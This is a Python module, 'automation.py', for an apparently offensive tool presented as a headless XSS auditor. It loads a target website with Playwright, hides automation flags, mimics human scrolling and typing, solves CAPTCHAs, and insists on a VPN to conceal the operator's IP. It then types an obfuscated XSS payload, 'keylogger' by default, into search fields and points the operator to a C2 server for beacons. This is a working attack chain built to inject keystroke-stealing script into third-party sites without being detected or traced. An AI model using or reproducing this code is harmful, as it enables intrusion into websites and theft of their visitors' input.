"""
automation.py - Automated Headless XSS Auditor

Uses Playwright for human-like browser automation with:
- CAPTCHA detection and solving
- Human-like typing, clicking, and scrolling
- VPN/IP safety checks
- Proof-of-concept screenshot capture
"""

import asyncio
import base64
import uuid
import logging
import random
import requests
import socket
from typing import Optional, List, Dict
from urllib.parse import urlparse
from playwright.async_api import async_playwright
from .factory import PayloadFactory
from .stealth import (
    CaptchaSolver,
    StealthConfig,
    human_type,
    human_click,
    human_scroll,
    human_mouse_move,
    async_human_delay,
    get_random_user_agent,
    get_random_viewport,
    USER_AGENTS,
)

logger = logging.getLogger(__name__)


class GhostAuditBot:
    """
    Automated headless auditor for XSS payloads.
    
    Features:
    - Human-like interaction patterns
    - CAPTCHA detection and solving
    - VPN safety verification
    - OAST/C2 beacon correlation
    """
    
    def __init__(
        self, 
        target_url: str, 
        c2_url: str, 
        headless: bool = True, 
        user_agent: Optional[str] = None,
        captcha_api_key: Optional[str] = None,
        stealth_config: Optional[StealthConfig] = None
    ):
        self.session_id = str(uuid.uuid4())[:8]
        self.target_url = target_url
        self.c2_url = c2_url
        self.headless = headless
        self.user_agent = user_agent
        self.factory = PayloadFactory(c2_base=self.c2_url)
        
        # Initialize stealth config
        self.config = stealth_config or StealthConfig()
        if captcha_api_key:
            self.config.captcha_api_key = captcha_api_key
        
        # Initialize CAPTCHA solver
        self.captcha_solver = CaptchaSolver(self.config)

    async def check_ip_safety(self, expected_org: str = "") -> bool:
        """
        Check if the current IP belongs to a VPN provider.
        
        Returns:
            True if VPN detected, False otherwise
        """
        try:
            # Get current IP info
            resp = requests.get("https://ipapi.co/json/", timeout=5)
            resp.raise_for_status()
            data = resp.json()
            current_org = data.get("org", "").lower()
            current_ip = data.get("ip", "Unknown")
            
            logger.info(f"Your IP: {current_ip}")
            logger.info(f"Location: {data.get('city')}, {data.get('region')}, {data.get('country_name')}")
            logger.info(f"ISP/Org: {data.get('org')}")
            
            # Detect target location for VPN recommendation
            try:
                target_host = urlparse(self.target_url).netloc
                target_ip = socket.gethostbyname(target_host)
                target_resp = requests.get(f"https://ipapi.co/{target_ip}/json/", timeout=5)
                target_data = target_resp.json()
                
                target_country = target_data.get("country_name", "Unknown")
                target_region = target_data.get("region", "Unknown")
                
                logger.info(f"Target server location: {target_data.get('city')}, {target_country}")
                
                # Recommend VPN region if not in same country
                if data.get("country_name") != target_country:
                    logger.warning(f"Consider using a VPN in {target_country} ({target_region}) for better results")
                    
            except Exception as e:
                logger.warning(f"Could not locate target server: {e}")

            # Check if using expected VPN
            if expected_org and expected_org.lower() in current_org:
                logger.info(f"✓ VPN detected: {expected_org}")
                return True
            
            # Heuristic check for common VPN/hosting keywords
            vpn_keywords = [
                "vpn", "hosting", "cloud", "datacenter", "data center",
                "m247", "packethub", "clouvider", "mullvad", "nordvpn",
                "expressvpn", "protonvpn", "surfshark", "cyberghost",
                "private internet", "ipvanish", "tunnelbear", "windscribe",
                "hetzner", "ovh", "digitalocean", "linode", "vultr", "aws"
            ]
            
            if any(k in current_org for k in vpn_keywords):
                logger.info("✓ VPN/datacenter connection detected")
                return True
            
            logger.warning("⚠ No VPN detected! Your real IP may be exposed.")
            logger.warning("Consider connecting to a VPN before proceeding.")
            return False
            
        except requests.exceptions.RequestException as e:
            logger.error(f"IP safety check network error: {e}")
            return False
        except Exception as e:
            logger.error(f"IP safety check internal error: {e}")
            return False

    async def _simulate_human_browsing(self, page) -> None:
        """Simulate human-like browsing behavior before injection."""
        # Random scrolling
        for _ in range(random.randint(1, 3)):
            await human_scroll(page, 'down', random.randint(100, 400))
            await async_human_delay(500, 1500)
        
        # Maybe scroll back up
        if random.random() < 0.4:
            await human_scroll(page, 'up', random.randint(50, 200))
            await async_human_delay(300, 800)
        
        # Move mouse randomly
        for _ in range(random.randint(2, 5)):
            x = random.randint(100, 800)
            y = random.randint(100, 600)
            await human_mouse_move(page, x, y)
            await async_human_delay(100, 400)

    async def run(
        self, 
        payload_name: str = "keylogger", 
        interaction_selector: Optional[str] = None,
        skip_vpn_check: bool = False,
        solve_captcha: bool = True
    ) -> Optional[str]:
        """
        Launch the automated attack chain with human-like behavior.
        
        Args:
            payload_name: Name of payload to inject
            interaction_selector: CSS selector for input element
            skip_vpn_check: Skip VPN safety check
            solve_captcha: Attempt to solve CAPTCHAs automatically
            
        Returns:
            Path to proof screenshot or None if failed
        """
        # VPN safety check
        if not skip_vpn_check:
            is_safe = await self.check_ip_safety()
            if not is_safe:
                logger.error("Aborting: No VPN detected. Use skip_vpn_check=True to override.")
                return None
        
        async with async_playwright() as p:
            # Launch browser with stealth settings
            browser = await p.chromium.launch(
                headless=self.headless,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--disable-dev-shm-usage',
                    '--no-sandbox',
                ]
            )
            
            # Get random viewport and user agent
            viewport = get_random_viewport()
            ua = self.user_agent or get_random_user_agent()
            
            context = await browser.new_context(
                viewport={'width': viewport[0], 'height': viewport[1]},
                user_agent=ua,
                locale='en-US',
                timezone_id='America/New_York',
            )
            
            # Add stealth scripts to avoid detection
            await context.add_init_script("""
                // Override webdriver detection
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined,
                });
                
                // Override automation indicators
                window.chrome = {
                    runtime: {},
                };
                
                // Fix permissions
                const originalQuery = window.navigator.permissions.query;
                window.navigator.permissions.query = (parameters) => (
                    parameters.name === 'notifications' ?
                        Promise.resolve({ state: Notification.permission }) :
                        originalQuery(parameters)
                );
                
                // Add plugins array
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [1, 2, 3, 4, 5],
                });
                
                // Add languages
                Object.defineProperty(navigator, 'languages', {
                    get: () => ['en-US', 'en'],
                });
            """)
            
            page = await context.new_page()
            
            logger.info(f"Navigating to {self.target_url}")
            logger.info(f"Using viewport: {viewport[0]}x{viewport[1]}")
            logger.info(f"Using UA: {ua[:50]}...")
            
            try:
                await page.goto(self.target_url, wait_until='networkidle', timeout=30000)
            except Exception as e:
                logger.error(f"Navigation failed: {e}")
                await browser.close()
                return None
            
            # Simulate human browsing behavior
            logger.info("Simulating human browsing behavior...")
            await self._simulate_human_browsing(page)
            
            # Check for CAPTCHA
            if solve_captcha and self.captcha_solver.is_configured():
                logger.info("Checking for CAPTCHA...")
                captcha_solved = await self.captcha_solver.solve_on_page(page)
                if not captcha_solved:
                    logger.warning("CAPTCHA detected but could not be solved")
            elif solve_captcha:
                captcha_detected = await self.captcha_solver.detect_captcha(page)
                if captcha_detected:
                    logger.warning(f"CAPTCHA detected ({captcha_detected['type']}) but no API key configured!")
                    logger.warning("Set CAPTCHA_API_KEY environment variable to enable solving")
            
            # Generate payload
            payload = self.factory.select_payload(payload_name, context="html", obfuscation="base64")
            
            if interaction_selector:
                logger.info(f"Injecting payload via selector: {interaction_selector}")
                
                try:
                    await page.wait_for_selector(interaction_selector, timeout=10000)
                except Exception:
                    logger.error(f"Selector not found: {interaction_selector}")
                    await browser.close()
                    return None
                
                # Human-like click on input
                await human_click(page, interaction_selector)
                
                # Human-like typing of payload
                await human_type(page, payload)
                
                # Random pause before submit
                await async_human_delay(300, 800)
                
                # Submit
                await page.keyboard.press("Enter")
                
            else:
                # Try to find common input elements
                common_selectors = [
                    'input[type="search"]',
                    'input[name="q"]',
                    'input[name="search"]',
                    'input[name="query"]',
                    'input#search',
                    'input.search',
                    'textarea',
                ]
                
                found_input = False
                for selector in common_selectors:
                    try:
                        element = await page.query_selector(selector)
                        if element and await element.is_visible():
                            logger.info(f"Found input element: {selector}")
                            await human_click(page, selector)
                            await human_type(page, payload)
                            await page.keyboard.press("Enter")
                            found_input = True
                            break
                    except Exception:
                        continue
                
                if not found_input:
                    logger.warning("No suitable input found. Waiting for manual trigger...")
                    await async_human_delay(3000, 5000)
            
            # Wait for payload execution
            logger.info("Waiting for payload execution...")
            await async_human_delay(3000, 5000)
            
            # Take proof screenshot
            proof_path = f"proof_{self.session_id}.png"
            await page.screenshot(path=proof_path, full_page=True)
            logger.info(f"✓ Proof saved to {proof_path}")
            
            # Log beacon endpoint
            logger.info(f"Check C2 for beacons: {self.c2_url}/logs")
            
            await browser.close()
            return proof_path
